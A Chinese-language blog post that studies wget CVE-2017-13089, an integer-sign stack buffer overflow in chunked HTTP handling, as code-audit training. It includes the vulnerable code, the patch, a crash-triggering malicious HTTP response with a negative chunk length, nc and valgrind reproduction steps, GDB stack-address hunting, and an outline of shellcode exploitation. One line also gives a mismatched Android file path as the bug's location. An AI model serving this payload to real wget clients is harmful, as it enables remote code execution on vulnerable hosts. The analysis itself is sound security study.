<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="代码审计,整数溢出,">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="对于开源软件wget中的cve漏洞的审计训练。">
<meta name="keywords" content="代码审计,整数溢出">
<meta property="og:type" content="article">
<meta property="og:title" content="代码审计训练-cve-2017-13089">
<meta property="og:url" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/index.html">
<meta property="og:site_name" content="Aye&#39;s house">
<meta property="og:description" content="对于开源软件wget中的cve漏洞的审计训练。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/1.png">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/2.png">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/4.png">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/3.png">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/5.png">
<meta property="og:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/6.png">
<meta property="og:updated_time" content="2019-08-14T12:19:58.893Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="代码审计训练-cve-2017-13089">
<meta name="twitter:description" content="对于开源软件wget中的cve漏洞的审计训练。">
<meta name="twitter:image" content="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/">





  <title>代码审计训练-cve-2017-13089 | Aye's house</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Aye's house</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/16/代码审计训练-cve-2017-13089/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ayesawyer">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Aye's house">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">代码审计训练-cve-2017-13089</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-16T16:28:19+08:00">
                2019-07-16
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞挖掘-利用/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞挖掘/利用</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2019/07/16/代码审计训练-cve-2017-13089/" class="leancloud_visitors" data-flag-title="代码审计训练-cve-2017-13089">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv">
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>对于开源软件wget中的cve漏洞的审计训练。</p>
<a id="more"></a>
<h2 id="1-官方说明"><a href="#1-官方说明" class="headerlink" title="1.官方说明"></a>1.官方说明</h2><p>cve-2017-13089——</p>
<blockquote>
<p>The http.c:skip_short_body() function is called in some circumstances, such as when processing redirects. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk’s length, but doesn’t check that the chunk length is a non-negative number. The code then tries to skip the chunk in pieces of 512 bytes by using the MIN() macro, but ends up passing the negative chunk length to connect.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument.</p>
</blockquote>
<h2 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h2><p><strong>漏洞代码位置：system/bta/hl/bta_hl_main.cc/bta_hl_sdp_query_results</strong></p>
<h3 id="A-准备"><a href="#A-准备" class="headerlink" title="A.准备"></a>A.准备</h3><p>wget 是一个从网络上自动下载文件的工具，支持通过 HTTP、HTTPS、FTP 三种最常见的 TCP/IP 协议。</p>
<blockquote>
<p>漏洞版本软件下载：<a href="ftp://ftp.gnu.org/gnu/wget/wget-1.19.1.tar.gz" target="_blank" rel="noopener"><code>ftp://ftp.gnu.org/gnu/wget/wget-1.19.1.tar.gz</code></a><br>漏洞代码位置：<strong>wget-1.19.1.tar\wget-1.19.1\src\http.c\skip_short_body</strong></p>
</blockquote>
<h3 id="B-一些关键API"><a href="#B-一些关键API" class="headerlink" title="B.一些关键API"></a>B.一些关键API</h3><h4 id="strtol"><a href="#strtol" class="headerlink" title="strtol()"></a><strong><a href="https://www.runoob.com/cprogramming/c-function-strtol.html" target="_blank" rel="noopener">strtol()</a></strong></h4><blockquote>
<p><code>long int strtol(const char *str, char **endptr, int base)</code><br>str – 要转换为长整数的字符串。<br>endptr – 对类型为 char* 的对象的引用，其值由函数设置为 str 中数值后的下一个字符。<br>base – 基数，必须介于 2 和 36（包含）之间，或者是特殊值 0。</p>
</blockquote>
<p>把参数 str 所指向的字符串根据给定的 base 转换为一个长整数（类型为 long int 型），base 必须介于 2 和 36（包含）之间，或者是特殊值 0。该函数返回转换后的长整数，如果没有执行有效的转换，则返回一个零值。</p>
<h4 id="read"><a href="#read" class="headerlink" title="read()"></a><strong><a href="http://c.biancheng.net/cpp/html/239.html" target="_blank" rel="noopener">read()</a></strong></h4><blockquote>
<p><code>ssize_t read(int fd, void * buf, size_t count)</code>;</p>
</blockquote>
<p>read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中. 若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动。</p>
<h3 id="C-具体审计"><a href="#C-具体审计" class="headerlink" title="C.具体审计"></a>C.具体审计</h3><p>skip_short_body()方法中关键源代码如下图所示。</p>
<p><img src="/2019/07/16/代码审计训练-cve-2017-13089/1.png" alt=""></p>
<p>根据官方描述也可以看出关键的漏洞点在以下代码处——</p>
<pre><code>remaining_chunk_size = strtol (line, &amp;endl, 16); 
//这里在使用strtol函数将读取的字符串转换为16进制的长整型整数之前，并没有判断输入可能为负的情况；

contlen = MIN (remaining_chunk_size, SKIP_SIZE);   
//取remaining_chunk_size和512的最小值；
//如果remaining_chunk_size为负，那么我们就可以通过输入控制contlen的值；

ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), -1);
//这里是从fd所指处读入MIN (contlen, SKIP_SIZE)个字节到dlbuf中；
//而我们可以通过输入控制读入字节数MIN (contlen, SKIP_SIZE)；
//dlbuf的大小只有513，所以只要我们控制读入字节数大于这个值，就会导致溢出。
</code></pre><p><strong>关于strtol()函数——</strong>具体测试如下——</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
{
   char str[30] = &quot;-fffffD00 This is test&quot;;
   char *ptr;
   long ret;

   ret = strtol(str, &amp;ptr, 16);
   printf(&quot;数字（无符号长整数）是 %ld\n&quot;, ret);
   printf(&quot;字符串部分是 |%s|&quot;, ptr);

   return(0);
 }
</code></pre><p><strong>测试输出结果如下——</strong></p>
<p><img src="/2019/07/16/代码审计训练-cve-2017-13089/2.png" alt=""></p>
<h3 id="D-漏洞补丁"><a href="#D-漏洞补丁" class="headerlink" title="D.漏洞补丁"></a>D.漏洞补丁</h3><p><img src="/2019/07/16/代码审计训练-cve-2017-13089/4.png" alt=""></p>
<p>如上图所示，补丁就是对 remaining_chunk_size 是否为负值进行了判断。</p>
<h3 id="E-总结不足"><a href="#E-总结不足" class="headerlink" title="E.总结不足"></a>E.总结不足</h3><ol>
<li><p>最开始在没有查看官方说明的情况下，是没怎么找到这个漏洞的，原因在于对<code>strtol</code>方法的不熟悉，以及对于整型溢出漏洞可能的出现场景<strong>（有整数之间的比较如取最小值等，比较之后的结果能控制后续的数据拷贝；即可能通过输入负值绕过后续某个缓冲区长度的限制）</strong>的敏感程度不够高。</p>
</li>
<li><p>即使在参考了官方说明后成功找到该漏洞，但分析还不够精细，<strong>更进一步的分析</strong>应该包括：查看漏洞函数的输入来源（需要判断输入是否是用户可控的，才能判断该漏洞的可利用性）、可尝试进一步分析输入的负数要满足市民条件才能突破缓冲区长度的限制（详见后续漏洞利用参考教程中的分析）。</p>
</li>
</ol>
<h2 id="3-漏洞利用学习"><a href="#3-漏洞利用学习" class="headerlink" title="3.漏洞利用学习"></a>3.漏洞利用学习</h2><p><strong>结合网上的教程对漏洞利用过程进行学习。</strong></p>
<p>主要参考教程包括——</p>
<blockquote>
<p><a href="http://www.gandalf.site/2019/01/cve-2017-13089wget.html" target="_blank" rel="noopener">漏洞分析（一）CVE-2017-13089_wget栈溢出</a><br><a href="https://paper.seebug.org/453/" target="_blank" rel="noopener">wget 缓冲区溢出漏洞分析（CVE-2017-13089）</a><br><a href="https://paper.seebug.org/525/" target="_blank" rel="noopener">wget 缓冲区溢出漏洞分析（CVE-2017-13089）</a></p>
</blockquote>
<p>引发崩溃的payload文件如下——</p>
<pre><code>HTTP/1.1 401 Not Authorized
Content-Type: text/plain; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

-0xFFFFFD00
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0
</code></pre><p><strong>关键知识点列出如下——</strong></p>
<h3 id="A-Linux下的漏洞调试"><a href="#A-Linux下的漏洞调试" class="headerlink" title="A.Linux下的漏洞调试"></a>A.Linux下的漏洞调试</h3><p>除了程序运行时的输出信息/报错信息，在linux下还可通过以下方式定位漏洞函数点（包括但不限于）。</p>
<h4 id="（1）core-dump"><a href="#（1）core-dump" class="headerlink" title="（1）core dump"></a>（1）core dump</h4><p>core dump又叫核心转储, 当程序运行过程中发生异常, 程序异常退出时, 由操作系统把程序当前的内存状况存储在一个core文件中。使用ulimit -c查看core dump是否打开，如果结果为0，则表示此功能处于关闭状态，打开方式如下，同时限制core dump文件大小为1024k：</p>
<blockquote>
<p>$ ulimit -c 1024</p>
</blockquote>
<p>当程序崩溃产生core文件后，我们可以通过gdb调试core文件尝试定位漏洞点。</p>
<blockquote>
<p><a href="https://www.cnblogs.com/bodhitree/p/5850212.html" target="_blank" rel="noopener">linux core dump 文件 gdb分析</a></p>
</blockquote>
<h4 id="（2）通过Valgrind-memcheck工具定位漏洞位置"><a href="#（2）通过Valgrind-memcheck工具定位漏洞位置" class="headerlink" title="（2）通过Valgrind memcheck工具定位漏洞位置"></a>（2）通过Valgrind memcheck工具定位漏洞位置</h4><h5 id="Valgrind工具简介"><a href="#Valgrind工具简介" class="headerlink" title="Valgrind工具简介"></a>Valgrind工具简介</h5><p>Valgrind是用于构建动态分析工具的探测框架。它包括一个工具集，每个工具执行某种类型的调试、分析或类似的任务，以帮助完善你的程序。</p>
<ol>
<li>Valgrind的架构是模块化的，所以可以容易地创建新的工具而又不会扰乱现有的结构。</li>
<li>Memcheck是一个内存错误检测器。它有助于使你的程序，尤其是那些用C和C++的程序，更加准确。</li>
<li>Cachegrind是一个缓存和分支预测分析器。它有助于使你的程序运行更快。</li>
<li>Callgrind是一个调用图缓存生成分析器。它与Cachegrind的功能有重叠，但也收集Cachegrind不收集的一些信息。</li>
<li>Helgrind是一个线程错误检测器。它有助于使你的多线程程序更加准确。</li>
<li>DRD也是一个线程错误检测器。它和Helgrind相似，但使用不同的分析技术，所以可能找到不同的问题。</li>
<li>Massif是一个堆分析器。它有助于使你的程序使用更少的内存。</li>
<li>DHAT是另一种不同的堆分析器。它有助于理解块的生命期、块的使用和布局的低效等问题。</li>
<li>SGcheck是一个实验工具，用来检测堆和全局数组的溢出。它的功能和Memcheck互补：SGcheck找到Memcheck无法找到的问题，反之亦然。</li>
<li>BBV是个实验性质的SimPoint基本块矢量生成器。它对于进行计算机架构的研究和开发很有用处。</li>
</ol>
<h5 id="Valgrind工具安装"><a href="#Valgrind工具安装" class="headerlink" title="Valgrind工具安装"></a>Valgrind工具安装</h5><p>安装Valgrind工具比较简单，linxu下直接apt安装即可：</p>
<blockquote>
<p>$ apt install valgrind</p>
</blockquote>
<h5 id="使用Valgrind-memcheck定位漏洞位置-以当前漏洞为例"><a href="#使用Valgrind-memcheck定位漏洞位置-以当前漏洞为例" class="headerlink" title="使用Valgrind memcheck定位漏洞位置(以当前漏洞为例)"></a>使用Valgrind memcheck定位漏洞位置(以当前漏洞为例)</h5><p>运行payload，即通过nc将payload加载在本地6666端口；</p>
<blockquote>
<p>$ nc -lp 6666 &lt; payload</p>
</blockquote>
<p>另开一个终端，通过valgrind来运行wget加载payload；</p>
<blockquote>
<p>$ valgrind –tool=memcheck ./src/wget localhost:6666</p>
</blockquote>
<p>触发crash后，查看memcheck输出，可以看到引发问题的函数为skip_short_body，之后即可开始源码分析。</p>
<p><img src="/2019/07/16/代码审计训练-cve-2017-13089/3.png" alt=""></p>
<h3 id="B-源码分析"><a href="#B-源码分析" class="headerlink" title="B.源码分析"></a>B.源码分析</h3><p><strong>参考教程中的源码分析部分补充了自己在进行代码审计过程中的不足。</strong></p>
<p>重点在于remaining_chunk_size的赋值，定义如下，其中strtol用于将字符串转换成16进制的long(长整型数)，所以关键在于line的值：</p>
<pre><code>remaining_chunk_size = strtol (line, &amp;endl, 16);
</code></pre><p>line来自fd_read_line (fd)，其中fd为skip_short_body的输入，即用户输入的数据；而fd_read_line (fd)来自fd_read_hunk()的返回：</p>
<pre><code>char *line = fd_read_line (fd);

skip_short_body (int fd, wgint contlen, bool chunked)

fd_read_line (int fd)
{
    return fd_read_hunk (fd, line_terminator, 128, FD_READ_LINE_MAX);
}
</code></pre><p>./src/retr.c/fd_read_hunk()源码中描述如下图，从描述来看，该函数用于读取HTTP的响应数据，会逐行读取并返回读取到的数据，直到NULL截止；而输入的数据fd是可控的，所以在其中写入一个特定的负值，即可绕过bufsize=dlbuf=SKIP_SIZE+1=512+1的限制，payload中使用-0xFFFFFD00：</p>
<p><img src="/2019/07/16/代码审计训练-cve-2017-13089/5.png" alt=""></p>
<p>对于payload中的-0xFFFFFD00，通过如下代码计算出remaining_chunk_size的值：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main ()
{
    char *line=&quot;-0xFFFFFD00&quot;;
    char *endl;
    printf(&quot;长10进制=%ld\n&quot;,strtol(line, &amp;endl, 16));
    printf(&quot;短10进制=%d\n&quot;,strtol(line, &amp;endl, 16));
    printf(&quot;长16进制=%lx\n&quot;,strtol(line, &amp;endl, 16));
    printf(&quot;短16进制=%x\n&quot;,strtol(line, &amp;endl, 16));
}
</code></pre><p>程序输出结果如下，<strong>long类型数据在64位系统中长8字节，即用长数据表示；而在32位系统中长4字节，用短数据表示</strong>：</p>
<pre><code>长10进制=-4294966528 
短10进制=768
长16进制=ffffffff00000300
短16进制=300
</code></pre><p>由于fd_read()仅会接受一个int bufsize参数，int类型数据在32/64位系统中都只有4字节；当试图放入8字节的remaining_chunk_size的负参数时，块长度的高4字节被丢弃，则可以控制fd_read()中的长度参数=0x300=768；而buf的大小dlbuf=SKIP_SIZE+1=512+1，从而产生整形栈缓冲区溢出漏洞。</p>
<pre><code>int fd_read (int fd, char *buf, int bufsize, double timeout)
</code></pre><h3 id="C-定位栈地址"><a href="#C-定位栈地址" class="headerlink" title="C.定位栈地址"></a>C.定位栈地址</h3><h4 id="（1）动态调试"><a href="#（1）动态调试" class="headerlink" title="（1）动态调试"></a>（1）动态调试</h4><p>使用GDB一步一步动态调试，跟踪数据处理流程，以发现输入数据在栈中的起始地址。</p>
<h4 id="（2）内存搜索"><a href="#（2）内存搜索" class="headerlink" title="（2）内存搜索"></a>（2）内存搜索</h4><p>除了一步步调试，还有一个简单的方法用来定位栈地址：</p>
<ol>
<li>修改payload——将payload里负值-0xFFFFFD00之后的一长串A的开头8个字符改为ABCDabdc</li>
<li><p>检索payload——gdb调试wget加载payload后，利用<strong>peda插件的searchmem</strong>搜索内存功能检索payload内容，得到输入数据在栈中的起始stack栈地址为：0x7fffffffd2a0</p>
<p> gdb-peda$ searchmem ABCDabdc<br> Searching for ‘ABCDabdc’ in: None ranges<br> Found 3 results, display max 3 items:<br> [heap] : 0x5555555fc6f9 (“ABCDabdc”, ‘A’ <repeats 366="" times="">)<br> [heap] : 0x5555555fcd85 (“ABCDabdc”, ‘A’ <repeats 760="" times="">, “Skipping -4294967296 bytes of body: [] aborting (EOF received).\n”)<br> [stack] : 0x7fffffffd2a0 (“ABCDabdc”, ‘A’ <repeats 760="" times="">, “P\330\377\377\377\177”)</repeats></repeats></repeats></p>
</li>
</ol>
<h3 id="D-漏洞利用"><a href="#D-漏洞利用" class="headerlink" title="D.漏洞利用"></a>D.漏洞利用</h3><ol>
<li>利用metasploit构造shellcode；</li>
<li>最终构造的利用payload如下——</li>
</ol>
<p><img src="/2019/07/16/代码审计训练-cve-2017-13089/6.png" alt=""></p>
<ol start="3">
<li>在实际利用的过程中要注意，程序wget正常编译执行是开启了NX和PIE的，所以需要在编译时关闭这两个安全选项才能实现成功利用。</li>
</ol>
<blockquote>
<p><a href="https://wizardforcel.gitbooks.io/metasploit-manual/content/3.html" target="_blank" rel="noopener">linux下安装Metasploit</a></p>
</blockquote>
<h3 id="E-备注"><a href="#E-备注" class="headerlink" title="E.备注"></a>E.备注</h3><p>该漏洞由于需要写入一定范围的负值以及特定长度的数据，故通过fuzz挖掘出来的可能性较低；更适合通过源码审计，检查读/写buf时长度的检查是否完备，尤其是对于负数的检查。</p>
<p>另外由于64位系统的普及，一些差异会导致<strong>在32位下安全的函数变得不再安全，如本次漏洞中的strtol()函数</strong>，在32位下long类型数据只有4字节，而在64位下long类型数据为8字节，从而产生了通过长负数来绕过buf检查的漏洞。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
          
            <a href="/tags/整数溢出/" rel="tag"># 整数溢出</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/12/HTTP基础知识/" rel="next" title="HTTP基础知识">
                <i class="fa fa-chevron-left"></i> HTTP基础知识
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/18/安全面经。。。/" rel="prev" title="安全面经。。。">
                安全面经。。。 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="ayesawyer">
          <p class="site-author-name" itemprop="name">ayesawyer</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">96</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">9</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">32</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/ayesawyer" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        
          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
            <div class="links-of-blogroll-title">
              <i class="fa  fa-fw fa-globe"></i>
              友情链接
            </div>
            <ul class="links-of-blogroll-list">
              
                <li class="links-of-blogroll-item">
                  <a href="https://luo-double-kua.github.io/" title="隔壁xxx的小窝" target="_blank">隔壁xxx的小窝</a>
                </li>
              
            </ul>
          </div>
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-官方说明"><span class="nav-number">1.</span> <span class="nav-text">1.官方说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-代码审计"><span class="nav-number">2.</span> <span class="nav-text">2.代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-准备"><span class="nav-number">2.1.</span> <span class="nav-text">A.准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-一些关键API"><span class="nav-number">2.2.</span> <span class="nav-text">B.一些关键API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#strtol"><span class="nav-number">2.2.1.</span> <span class="nav-text">strtol()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#read"><span class="nav-number">2.2.2.</span> <span class="nav-text">read()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-具体审计"><span class="nav-number">2.3.</span> <span class="nav-text">C.具体审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#D-漏洞补丁"><span class="nav-number">2.4.</span> <span class="nav-text">D.漏洞补丁</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#E-总结不足"><span class="nav-number">2.5.</span> <span class="nav-text">E.总结不足</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-漏洞利用学习"><span class="nav-number">3.</span> <span class="nav-text">3.漏洞利用学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-Linux下的漏洞调试"><span class="nav-number">3.1.</span> <span class="nav-text">A.Linux下的漏洞调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）core-dump"><span class="nav-number">3.1.1.</span> <span class="nav-text">（1）core dump</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）通过Valgrind-memcheck工具定位漏洞位置"><span class="nav-number">3.1.2.</span> <span class="nav-text">（2）通过Valgrind memcheck工具定位漏洞位置</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Valgrind工具简介"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">Valgrind工具简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Valgrind工具安装"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">Valgrind工具安装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Valgrind-memcheck定位漏洞位置-以当前漏洞为例"><span class="nav-number">3.1.2.3.</span> <span class="nav-text">使用Valgrind memcheck定位漏洞位置(以当前漏洞为例)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-源码分析"><span class="nav-number">3.2.</span> <span class="nav-text">B.源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-定位栈地址"><span class="nav-number">3.3.</span> <span 